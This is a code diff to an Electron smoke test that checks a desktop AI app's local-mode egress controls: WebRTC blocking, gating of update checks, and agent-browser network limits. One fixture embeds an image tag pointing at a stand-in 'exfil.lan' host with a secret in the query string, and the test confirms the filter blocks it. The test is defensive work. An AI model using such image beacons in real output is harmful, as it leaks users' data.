@@ -8,11 +8,12 @@ import { mkdtempSync } from "node:fs"
 import http from "node:http"
 import { tmpdir } from "node:os"
 import path from "node:path"
-import { app, BrowserWindow, session, webContents } from "electron"
+import { app, BrowserWindow, net, session, webContents } from "electron"
 import { Egress } from "@vectordevai/core/local-mode/egress"
 import { LocalPolicy } from "@vectordevai/core/local-mode/policy"
+import { AGENT_BROWSER_PREFERENCES } from "../src/main/browser-agent"
 import { egressFilter } from "../src/main/egress-filter"
-import { installChromiumLocal } from "../src/main/local-mode"
+import { duringUpdateCheck, installChromiumLocal } from "../src/main/local-mode"
 
 export type Check = { name: string; ok: boolean; detail?: string; note?: boolean }
 
@@ -21,7 +22,7 @@ const home = mkdtempSync(path.join(tmpdir(), "vector-local-smoke-"))
 app.setPath("userData", path.join(home, "user-data"))
 // The smoke's web: every name under web.test is this computer, for Chromium only. Vector Local still reads the names
 // as internet hosts, as it would read real ones.
-app.commandLine.appendSwitch("host-resolver-rules", "MAP *.web.test 127.0.0.1")
+app.commandLine.appendSwitch("host-resolver-rules", "MAP *.web.test 127.0.0.1, MAP *.lan 127.0.0.1")
 // No keychain question for the agent browser's cookie store on macOS, and no stored password on Linux.
 app.commandLine.appendSwitch("use-mock-keychain")
 app.commandLine.appendSwitch("password-store", "basic")
@@ -41,13 +42,47 @@ const server = http.createServer((request, response) => {
   document.documentElement.appendChild(frame)
   window.peers = { page: typeof RTCPeerConnection, frame: typeof frame.contentWindow.RTCPeerConnection }
 </script>`)
+  // What a Vector window shows: a reply's image on your network, and the app's own request to its server there.
+  if (request.url === "/app")
+    return void response.end(`<!doctype html><title>app</title>
+<img src="http://exfil.lan:${port}/pixel.png?d=secret">
+<script>
+  window.server = fetch("http://box.lan:${port}/api/session").then((answer) => answer.text(), () => "refused")
+</script>`)
+  if (request.url === "/frames")
+    return void response.end(`<!doctype html><title>frames</title>
+<iframe src="http://${host}:${port}/inner"></iframe>
+<script>
+  window.framed = new Promise((resolve) => {
+    const frame = document.querySelector("iframe")
+    frame.addEventListener("load", () => resolve(typeof frame.contentWindow.RTCPeerConnection))
+  })
+</script>`)
+  if (request.url === "/inner") return void response.end("<!doctype html><title>inner</title>")
+  // A Vector server answers the app's window, which is of another origin.
+  if (request.url === "/api/session") {
+    response.setHeader("access-control-allow-origin", "*")
+    return void response.end("ok")
+  }
   if (request.url?.endsWith(".js")) return void response.end("window.loaded = (window.loaded || 0) + 1")
   response.end("ok")
 })
 
 const checks: Check[] = []
 const check = (name: string, ok: boolean, detail?: string) => checks.push({ name, ok, ...(detail ? { detail } : {}) })
-const note = (name: string, detail: string) => checks.push({ name, ok: true, detail, note: true })
+const finish = () => {
+  console.log(`${MARK}${JSON.stringify(checks)}`)
+  server.close()
+  app.exit(0)
+}
+// An error outside a check would open Electron's error dialog and hold the run until it times out; it fails the
+// smoke instead.
+const crashed = (error: unknown) => {
+  check("the smoke ran to the end", false, error instanceof Error ? error.stack : String(error))
+  finish()
+}
+process.on("uncaughtException", crashed)
+process.on("unhandledRejection", crashed)
 
 await app.whenReady()
 await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve))
@@ -57,19 +92,49 @@ const local = `http://127.0.0.1:${port}/page`
 const policy = (web: "ask" | "none") => LocalPolicy.resolve({ global: { enabled: true, web } })
 Egress.configure(policy("ask"))
 
-installChromiumLocal({
+// A window opened before Vector Local is turned on, as the main window is when the person turns it on in Settings.
+Egress.configure(LocalPolicy.OFF)
+const before = new BrowserWindow({ show: false, webPreferences: { sandbox: true, contextIsolation: true } })
+const chromium = installChromiumLocal({
   app,
   defaultSession: session.defaultSession,
   fromPartition: (partition, options) => session.fromPartition(partition, options),
   webContents: () => webContents.getAllWebContents(),
   directory: path.join(home, "local-mode"),
 })
+Egress.configure(policy("ask"))
+chromium.apply()
+check(
+  "a window opened before Vector Local was turned on keeps WebRTC off UDP once it is",
+  before.webContents.getWebRTCIPHandlingPolicy() === "disable_non_proxied_udp",
+  before.webContents.getWebRTCIPHandlingPolicy(),
+)
+before.destroy()
 
-// Loads a page in a hidden window of `partition` (Vector's own windows when none); resolves whether it loaded.
+// Asks the updater's session for `url` as electron-updater does (net.request on its own session); resolves the status
+// or the error.
+const updaterGet = (url: string) =>
+  new Promise<string>((resolve) => {
+    const request = net.request({ url, session: session.fromPartition("electron-updater", { cache: false }) })
+    request.on("response", (response) => {
+      response.on("data", () => undefined)
+      response.on("end", () => resolve(String(response.statusCode)))
+    })
+    request.on("error", (error) => resolve(error.message))
+    request.end()
+  })
+
+// Loads a page in a hidden window of `partition` (Vector's own windows when none), the agent's browser with the
+// preferences the agent's browser has; resolves whether it loaded.
 const load = async (url: string, partition?: string) => {
   const window = new BrowserWindow({
     show: false,
-    webPreferences: { sandbox: true, contextIsolation: true, ...(partition ? { partition } : {}) },
+    webPreferences: {
+      sandbox: true,
+      contextIsolation: true,
+      ...(partition === "persist:vector-browser" ? AGENT_BROWSER_PREFERENCES : {}),
+      ...(partition ? { partition } : {}),
+    },
   })
   const loaded = await window.loadURL(url).then(
     () => true,
@@ -102,21 +167,49 @@ try {
   check("…and the scripts the page loads", loaded === 2, `${loaded} scripts ran`)
   const peers = (await browse.window.webContents.executeJavaScript("window.peers")) as { page: string; frame: string }
   check("the agent's browser's pages have no RTCPeerConnection", peers.page === "undefined", peers.page)
-  note(
-    "a frame a page's script just made, in the agent's browser",
-    `RTCPeerConnection is ${peers.frame} there; WebRTC is held to no proxy by the IP handling policy`,
-  )
+  check("…nor does a frame a page's script just made", peers.frame === "undefined", peers.frame)
   const events = Egress.events().filter((event) => event.source === "agent-browser" && event.decision === "allow")
   const pages = events.filter((event) => event.resource === "page").map((event) => event.origin)
   const loads = events.filter((event) => event.resource === "subresource").map((event) => event.origin)
   check("the network log counts the agent's page once", pages.length === 1, pages.join(", "))
   check("…and what it loaded once per host", loads.length === 2 && new Set(loads).size === 2, loads.join(", "))
   const summary = Egress.summary()
-  check("the counters read 1 page and 3 hosts", summary.pages === 1 && summary.hosts === 3, JSON.stringify(summary))
+  check(
+    "the counters read 1 page and 2 other hosts it loaded",
+    summary.pages === 1 && summary.hosts === 2,
+    JSON.stringify(summary),
+  )
   browse.window.destroy()
+  const framed = await load(page("frames"), "persist:vector-browser")
+  const inner = await framed.window.webContents.executeJavaScript("window.framed")
+  check("…nor does a frame the page loads", inner === "undefined", String(inner))
+  framed.window.destroy()
+
+  // The updater's session: electron-updater's requests reach the dispatcher, which refuses an automatic check before
+  // it reaches the network and lets a check the person asked for reach the feed.
+  const feed = `http://updates.web.test:${port}/latest-mac.yml`
+  const automatic = await updaterGet(feed)
+  check("the updater's automatic check is refused", automatic !== "200", automatic)
+  check("…before it reaches the network", seen("updates.web.test") === 0)
+  const asked = await duringUpdateCheck(
+    (partition, options) => session.fromPartition(partition, options),
+    [feed],
+    () => updaterGet(feed),
+  )
+  check("a check the person asked for reaches the feed", asked === "200" && seen("updates.web.test") === 1, asked)
 
   // Web access None: the agent's browser reaches this computer only.
   Egress.configure(policy("none"))
+  // Vector's window still reaches the Vector server it connects to on your network, and nothing a reply shows there.
+  const shown = await load(`http://127.0.0.1:${port}/app`)
+  const server = await shown.window.webContents.executeJavaScript("window.server")
+  check(
+    "with Web access None, Vector's window reaches its server on your network",
+    server === "ok" && seen("box.lan") === 1,
+    String(server),
+  )
+  check("…and an image a reply shows loads nothing there", seen("exfil.lan") === 0)
+  shown.window.destroy()
   const none = await load(page("docs"), "persist:vector-browser")
   check("the agent's browser refuses an internet page with Web access None", !none.loaded)
   none.window.destroy()
@@ -152,6 +245,4 @@ try {
   check("the smoke ran to the end", false, error instanceof Error ? error.stack : String(error))
 }
 
-console.log(`${MARK}${JSON.stringify(checks)}`)
-server.close()
-app.exit(0)
+finish()
